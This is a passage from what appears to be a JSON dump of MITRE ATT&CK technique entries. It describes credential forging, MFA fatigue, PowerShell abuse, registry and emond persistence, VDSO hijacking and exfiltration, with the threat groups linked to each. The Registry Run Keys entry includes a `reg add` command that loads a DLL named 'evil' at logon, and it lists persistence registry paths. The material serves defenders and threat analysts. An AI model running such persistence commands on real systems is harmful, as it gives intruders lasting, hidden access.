values.^[[1]](https://github.com/damianh/aws-adfs-credential-generator)^ Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.^[[2]](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_request.html)^^[[3]](https://wiki.zimbra.com/wiki/Preauth)^\n\nOnce forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.^[[4]](https://wunderwuzzi23.github.io/blog/passthecookie.html)^^[[5]](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/)^^[[6]](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)^  ","platforms":["SaaS","Windows","macOS","Linux","Azure AD","Office 365","Google Workspace","IaaS"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1621":{"id":"T1621","name":"Multi-Factor Authentication Request Generation","description":"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\n\nAdversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.\n\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”^[[1]](https://therecord.media/russian-hackers-bypass-2fa-by-annoying-victims-with-repeated-push-notifications/)^^[[2]](https://portswigger.net/daily-swig/mfa-fatigue-attacks-users-tricked-into-allowing-device-access-due-to-overload-of-push-notifications)^^[[3]](https://www.mandiant.com/resources/russian-targeting-gov-business)^","platforms":["Windows","Office 365","Linux","macOS","IaaS","SaaS","Azure AD","Google Workspace"],"tactics":["Credential Access"],"campaigns":["C0027"],"groups":["APT29","Scattered Spider","LAPSUS$"]},"T1554":{"id":"T1554","name":"Compromise Client Software Binary","description":"Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.\n\nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)^[[1]](https://unit42.paloaltonetworks.com/banking-trojan-techniques/#post-125550-_rm3d6xxbk52n)^ prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.^[[2]](https://web-assets.esetstatic.com/wls/2021/10/eset_fontonlake.pdf)^\n\nSince these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.","platforms":["Linux","macOS","Windows"],"tactics":["Persistence"],"campaigns":["2016 Ukraine Electric Power Attack"],"groups":[]},"T1552.008":{"id":"T1552.008","name":"Chat Messages","description":"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation ^[[1]](https://www.nightfall.ai/blog/saas-slack-security-risks-2020)^.","platforms":["Office 365","SaaS","Google Workspace"],"tactics":["Credential Access"],"campaigns":[],"groups":["LAPSUS$"]},"T1059.001":{"id":"T1059.001","name":"PowerShell","description":"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.^[[1]](https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx)^ Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the `Start-Process` cmdlet which can be used to run an executable and the `Invoke-Command` cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.^[[2]](https://github.com/jaredhaight/PSAttack)^\n\nPowerShell commands/scripts can also be executed without directly invoking the `powershell.exe` binary through interfaces to PowerShell's underlying `System.Management.Automation` assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).^[[3]](https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367)^^[[4]](https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/)^^[[5]](https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/)^","platforms":["Windows"],"tactics":["Execution"],"campaigns":["2016 Ukraine Electric Power Attack","Operation Dream Job","Frankenstein","C0018","SolarWinds Compromise","Operation Wocao","C0021"],"groups":["WIRTE","Blue Mockingbird","APT39","Magic Hound","APT19","APT28","APT41","Sandworm Team","MoustachedBouncer","CopyKittens","Thrip","FIN13","Gorgon Group","FIN7","Ember Bear","TeamTNT","OilRig","Inception","Lazarus Group","APT32","Chimera","Volt Typhoon","Earth Lusca","Threat Group-3390","TA2541","Deep Panda","Indrik Spider","Cobalt Group","Leviathan","Wizard Spider","APT29","GALLIUM","FIN6","HEXANE","LazyScripter","HAFNIUM","Sidewinder","FIN10","TEMP.Veles","Gallmaker","Turla","Silence","Molerats","APT3","DarkVishnya","TA459","Gamaredon Group","Kimsuky","TA505","FIN8","APT33","BRONZE BUTLER","Mustang Panda","Patchwork","Tonto Team","APT38","DarkHydrus","GOLD SOUTHFIELD","menuPass","Poseidon Group","Stealth Falcon","MuddyWater","Fox Kitten","Dragonfly","Aquatic Panda","Confucius","Nomadic Octopus","UNC2452","Operation Wocao","Frankenstein","Dragonfly 2.0"]},"T1546.001":{"id":"T1546.001","name":"Change Default File Association","description":"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.^[[1]](https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs)^^[[2]](http://msdn.microsoft.com/en-us/library/bb166549.aspx)^^[[3]](https://docs.microsoft.com/windows-server/administration/windows-commands/assoc)^ Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under `HKEY_CLASSES_ROOT\\.[extension]`, for example `HKEY_CLASSES_ROOT\\.txt`. The entries point to a handler for that extension located at `HKEY_CLASSES_ROOT\\\\[handler]`. The various commands are then listed as subkeys underneath the shell key at `HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command`. For example: \n\n* `HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command`\n* `HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command`\n* `HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command`\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.^[[4]](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd)^","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":["Kimsuky"]},"T1055.014":{"id":"T1055.014","name":"VDSO Hijacking","description":"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).^[[1]](https://web.archive.org/web/20150711051625/http://vxer.org/lib/vrn00.html)^^[[2]](https://backtrace.io/blog/backtrace/elf-shared-library-injection-forensics/)^^[[3]](https://web.archive.org/web/20051013084246/http://www.trilithium.com/johan/2005/08/linux-gate/)^^[[4]](https://lwn.net/Articles/604515/)^\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ","platforms":["Linux"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1071.002":{"id":"T1071.002","name":"File Transfer Protocols","description":"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["Operation Honeybee"],"groups":["APT41","Dragonfly","SilverTerrier","Kimsuky","Honeybee","Machete"]},"T1212":{"id":"T1212","name":"Exploitation for Credential Access","description":"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. \n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.^[[1]](https://technet.microsoft.com/en-us/library/security/ms14-068.aspx)^^[[2]](https://adsecurity.org/?p=1515)^ Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.^[[3]](https://www.bugcrowd.com/glossary/replay-attack/)^^[[4]](https://www.comparitech.com/blog/information-security/what-is-a-replay-attack/)^^[[5]](https://twitter.com/MsftSecIntel/status/1671579359994343425)^\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.^[[6]](https://www.microsoft.com/en-us/security/blog/2023/07/14/analysis-of-storm-0558-techniques-for-unauthorized-email-access/)^\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.","platforms":["Linux","Windows","macOS","Azure AD"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1546.014":{"id":"T1546.014","name":"Emond","description":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at `/sbin/emond` will load any rules from the `/etc/emond.d/rules/` directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path `/private/var/db/emondClients`, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at`/System/Library/LaunchDaemons/com.apple.emond.plist`.^[[1]](https://www.xorrior.com/emond-persistence/)^^[[2]](http://www.magnusviri.com/Mac/what-is-emond.html)^^[[3]](https://www.sentinelone.com/blog/how-malware-persists-on-macos/)^\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.^[[1]](https://www.xorrior.com/emond-persistence/)^^[[2]](http://www.magnusviri.com/Mac/what-is-emond.html)^^[[3]](https://www.sentinelone.com/blog/how-malware-persists-on-macos/)^ Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.","platforms":["macOS"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":[]},"T1102.003":{"id":"T1102.003","name":"One-Way Communication","description":"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["Leviathan"]},"T1590":{"id":"T1590","name":"Gather Victim Network Information","description":"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).^[[1]](https://www.whois.net/)^^[[2]](https://dnsdumpster.com/)^^[[3]](https://www.circl.lu/services/passive-dns/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["HAFNIUM"]},"T1210":{"id":"T1210","name":"Exploitation of Remote Services","description":"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB ^[[1]](https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/)^ and RDP ^[[2]](https://nvd.nist.gov/vuln/detail/CVE-2017-0176)^ as well as applications that may be used within internal networks such as MySQL ^[[3]](https://nvd.nist.gov/vuln/detail/CVE-2016-6662)^ and web server services.^[[4]](https://nvd.nist.gov/vuln/detail/CVE-2014-7169)^\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.","platforms":["Linux","Windows","macOS"],"tactics":["Lateral Movement"],"campaigns":[],"groups":["Wizard Spider","Fox Kitten","Earth Lusca","APT28","Tonto Team","menuPass","Dragonfly","MuddyWater","Threat Group-3390","FIN7"]},"T1534":{"id":"T1534","name":"Internal Spearphishing","description":"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.^[[1]](https://blog.trendmicro.com/phishing-starts-inside/)^\n\nAdversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.\n\nThere have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.^[[1]](https://blog.trendmicro.com/phishing-starts-inside/)^ The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.^[[2]](https://labs.ft.com/2013/05/a-sobering-day/?mhq5j=e6)^","platforms":["Windows","macOS","Linux","Office 365","SaaS","Google Workspace"],"tactics":["Lateral Movement"],"campaigns":["Operation Dream Job"],"groups":["Gamaredon Group","Kimsuky","Leviathan","HEXANE","Lazarus Group"]},"T1574.010":{"id":"T1574.010","name":"Services File Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1547.001":{"id":"T1547.001","name":"Registry Run Keys / Startup Folder","description":"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.^[[1]](http://msdn.microsoft.com/en-us/library/aa376977)^ These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n\nRun keys may exist under multiple hives.^[[2]](https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry)^^[[3]](https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/)^ The `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx` is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.^[[1]](http://msdn.microsoft.com/en-us/library/aa376977)^ For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: `reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"` ^[[4]](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)^\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is `C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`. The startup folder path for all users is `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp`.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders`\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders`\n* `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders`\n* `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders`\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce`\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce`\n* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices`\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices`\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run`\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run`\n\nPrograms listed in the load value of the registry key `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows` run automatically for the currently logged-on user.\n\nBy default, the multistring `BootExecute` value of the registry key `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager` is set to `autocheck autochk *`. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":["Operation Dream Job","Operation Sharpshooter","Operation Honeybee"],"groups":["APT19","APT37","APT39","TA2541","RTM","Magic Hound","Inception","APT28","TeamTNT","Leviathan","Naikon","Silence","Gorgon Group","APT29","ZIRCONIUM","Patchwork","FIN6","Turla","Putter Panda","MuddyWater","Sidewinder","Threat Group-3390","Tropic Trooper","Lazarus Group","APT41","Windshift","FIN7","Dark Caracal","FIN10","PROMETHIUM","LuminousMoth","FIN13","Rocke","Molerats","Cobalt Group","Mustang Panda","Higaisa","Kimsuky","Dragonfly","LazyScripter","APT3","Darkhotel","APT33","BRONZE BUTLER","Ke3chang","Confucius","APT18","Gamaredon Group","Wizard Spider","APT32","Honeybee","Sharpshooter","Dragonfly 2.0","Machete"]},"T1199":{"id":"T1199","name":"Trusted Relationship","description":"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.^[[1]](https://us-cert.cisa.gov/APTs-Targeting-IT-Service-Provider-Customers)^\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.^[[2]](https://support.microsoft.com/en-us/topic/partners-offer-delegated-administration-26530dc0-ebba-415b-86b1-b55bc06b073e?ui=en-us&rs=en-us&ad=us)^","platforms":["Windows","SaaS","IaaS","Linux","macOS","Office 365"],"tactics":["Initial Access"],"campaigns":["SolarWinds Compromise"],"groups":["GOLD SOUTHFIELD","APT28","Threat Group-3390","Sandworm Team","menuPass","APT29","POLONIUM","LAPSUS$"]},"T1136.003":{"id":"T1136.003","name":"Cloud Account","description":"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.^[[1]](https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide)^^[[2]](https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d)^^[[3]](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_users_create.html)^^[[4]](https://support.google.com/cloudidentity/answer/7332836?hl=en&ref_topic=7558554)^^[[5]](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/add-users-azure-active-directory)^\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).","platforms":["Azure AD","Office 365","IaaS","Google Workspace","SaaS"],"tactics":["Persistence"],"campaigns":[],"groups":["APT29","LAPSUS$"]},"T1069.001":{"id":"T1069.001","name":"Local Groups","description":"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as `net localgroup` of the [Net](https://attack.mitre.org/software/S0039) utility, `dscl . -list /Groups` on macOS, and `groups` on Linux can list local groups.","platforms":["Linux","macOS","Windows"],"tactics":["Discovery"],"campaigns":["C0015","Operation Wocao","Operation CuckooBees"],"groups":["Turla","Tonto Team","HEXANE","admin@338","Chimera","Volt Typhoon","OilRig","Operation Wocao"]},"T1593":{"id":"T1593","name":"Search Open Websites/Domains","description":"Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.^[[1]](https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e)^^[[2]](https://securitytrails.com/blog/google-hacking-techniques)^^[[3]](https://www.exploit-db.com/google-hacking-database)^\n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Sandworm Team"]},"T1098":{"id":"T1098","name":"Account Manipulation","description":"Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).","platforms":["Windows","Azure AD","Office 365","IaaS","Linux","macOS","Google Workspace","SaaS","Network","Containers"],"tactics":["Persistence","Privilege Escalation"],"campaigns":["2016 Ukraine Electric Power Attack"],"groups":["Lazarus Group","APT41","APT3","Magic Hound","Dragonfly","FIN13","HAFNIUM","Kimsuky","Sandworm Team","Dragonfly 2.0"]},"T1048":{"id":"T1048","name":"Exfiltration Over Alternative Protocol","description":"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.^[[1]](http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/)^ On macOS and Linux `curl` may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.^[[2]](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)^\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).","platforms":["Linux","macOS","Windows","Office 365","SaaS","IaaS","Google Workspace","Network"],"tactics":["Exfiltration"],"campaigns":[],"groups":["TeamTNT"]},"T1547.006":{"id":"T1547.006","name":"Kernel Modules and Extensions","description":"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.^[[1]](https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf)^ \n\nWhen used maliciously, 